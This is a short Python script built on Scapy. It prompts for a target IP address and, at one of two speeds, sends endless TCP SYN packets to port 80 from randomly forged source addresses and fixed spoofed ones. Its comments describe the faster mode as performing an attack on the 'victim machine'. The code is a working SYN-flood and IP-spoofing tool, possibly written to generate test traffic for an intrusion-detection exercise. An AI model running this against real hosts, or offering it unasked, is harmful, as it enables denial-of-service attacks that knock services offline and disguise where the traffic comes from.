
from scapy.all import *
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether


def randomip():
    ip = ""
    for i in range(3):
        n = random.randint(0, 255)
        ip = ip + str(n) + "."
    n = random.randint(0, 255)
    ip = ip + str(n)
    return ip

def randomport():
    return random.randint(1024, 65000)


destIP = input("Enter the IP address of the target\n")
T = input(
    "Enter sp1 for 1 packet each 0.01sec\nEnter sp2 for 1 packet each 0.1 sec\n")
if T == "sp1":
    while True:
        #Normal Packet Sending
        sendp(Ether() / IP(src=randomip(), dst=destIP) / TCP(sport=randomport(), dport=80, flags='S'),
              inter=0.01)
        #These IP Perform Attack On The Victim Machine
        sendp(Ether() / IP(src="192.12.15.2", dst=destIP) / TCP(sport=randomport(), dport=80, flags='S'),
              inter=0.01)
        
elif T == "sp2":
    #With This Speed Non Of The IPs Will Perform An Attack
    while True:
        sendp(Ether() / IP(src=randomip(), dst=destIP) / TCP(sport=randomport(), dport=80, flags='S'),
              inter=0.1)
        sendp(Ether() / IP(src="192.12.15.1", dst=destIP) / TCP(sport=randomport(), dport=80, flags='S'),
              inter=0.1)
        sendp(Ether() / IP(src="192.12.15.2", dst=destIP) / TCP(sport=randomport(), dport=80, flags='S'),
              inter=0.1)
else:
    print("There is no such speed")